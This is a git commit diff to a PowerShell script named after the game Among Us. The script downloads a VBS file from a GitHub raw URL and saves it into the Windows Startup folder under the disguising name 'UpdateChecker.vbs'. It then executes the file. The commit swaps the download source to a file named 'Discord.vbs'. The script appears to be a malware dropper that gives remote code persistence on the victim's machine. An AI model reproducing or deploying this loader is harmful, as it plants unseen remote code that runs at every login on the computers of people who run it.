70f3b7e1c4bc939f28f4311d1b09bd34958c90a6
AmjadBalls <155375827+AmjadBalls@users.noreply.github.com>
2025-01-23 20:55:29 +0200

    Update AmongUs.ps1

--- AmongUs.ps1
+++ AmongUs.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/AmjadBalls/Ramizjaber12/refs/heads/main/UpdateChecker.vbs"
+$url = "https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Discord.vbs"
 $dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs"
 Invoke-WebRequest -Uri $url -OutFile $dest
 Start-Process $dest
